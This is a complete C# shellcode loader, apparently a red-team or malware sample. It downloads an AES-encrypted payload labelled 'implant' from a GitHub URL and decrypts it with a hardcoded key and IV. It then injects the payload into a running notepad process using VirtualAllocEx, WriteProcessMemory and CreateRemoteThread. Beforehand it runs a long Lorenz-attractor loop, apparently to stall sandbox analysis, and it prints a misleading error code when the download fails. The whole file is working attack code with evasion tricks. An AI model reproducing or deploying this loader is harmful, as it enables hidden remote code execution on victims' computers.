using System;
using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

class ProcessInjection
{
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr hObject);

    const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
    const uint MEM_COMMIT = 0x00001000;
    const uint MEM_RESERVE = 0x00002000;
    const uint PAGE_EXECUTE_READWRITE = 0x40;

    const string implant = "https://github.com/xirtam2669/Payloads/raw/refs/heads/main/cipher.bin";
    
    static byte[] iv = new byte[] { 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36 };
    static byte[] key = new byte[] { 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36 };

    static void lorenz()
    {
        double x0 = 0.1, y0 = 0, z0 = 0;
        double t = 0.01;

        double a = 10.0;
        double b = 28.0;
        double c = 8.0 / 3.0;

        try
        {
            for (int itr = 0; itr < 3000000; itr++)
            {
                var x1 = x0 + t * a * (y0 - x0);
                var y1 = y0 + t * (x0 * (b - z0) - y0);
                var z1 = z0 + t * (x0 * y0 - c * z0);

                x0 = x1;
                y0 = y1;
                z0 = z1;

                Console.WriteLine("X: " + x0 + "\nY: " + y0 + "\nZ: " + z0);

                itr++;
            }                       
        }
        catch
        {
            Console.WriteLine("WHOOPS");
        }
    }

    static byte[] Fetch(string url)
    {
        try
        {
            using (HttpClient client = new HttpClient())
            {
                byte[] encrypted_shellcode = client.GetByteArrayAsync(url).Result;              

                try
                {
                    byte[] shellcode = Decrypt(encrypted_shellcode, key, iv);
                    return shellcode;
                }
                catch
                {
                    Console.WriteLine("Sorry");
                    return [0x90];
                }

            }
        }
        catch
        {
            Console.WriteLine("RO_E_METADATA_INVALID_TYPE_FORMAT");
            return [0x90];
        }
    }

    static byte[] Decrypt(byte[] encrypted_shellcode, byte[] key, byte[] iv)
    {
        using (Aes aesAlg = Aes.Create())
        {
            aesAlg.Key = key;
            aesAlg.IV = iv;

            ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);

            using (MemoryStream msDecrypt = new MemoryStream(encrypted_shellcode))
            {
                using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                {
                    using (MemoryStream resultStream = new MemoryStream())
                    {
                        csDecrypt.CopyTo(resultStream);
                        return resultStream.ToArray();
                    }
                }
            }
        }
    }

    static void Main(string[] args)
    {

        lorenz();

        byte[] shellcode = Fetch(implant);

        Process targetProcess = Process.GetProcessesByName("notepad")[0];

        IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, targetProcess.Id);
        if (hProcess == IntPtr.Zero)
        {
            Console.WriteLine("Failed to open target process.");
            return;
        }

        IntPtr allocatedMemory = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (allocatedMemory == IntPtr.Zero)
        {
            Console.WriteLine("Failed to allocate memory in target process.");
            CloseHandle(hProcess);
            return;
        }

        IntPtr bytesWritten;
        if (!WriteProcessMemory(hProcess, allocatedMemory, shellcode, (uint)shellcode.Length, out bytesWritten))
        {
            Console.WriteLine("Failed to write shellcode to target process memory.");
            CloseHandle(hProcess);
            return;
        }

        IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, allocatedMemory, IntPtr.Zero, 0, out uint threadId);
        if (hThread == IntPtr.Zero)
        {
            Console.WriteLine("Failed to create remote thread.");
            CloseHandle(hProcess);
            return;
        }

        Console.WriteLine($"Injected shellcode into process {targetProcess.ProcessName} (PID: {targetProcess.Id}).");

        CloseHandle(hThread);
        CloseHandle(hProcess);
    }
}
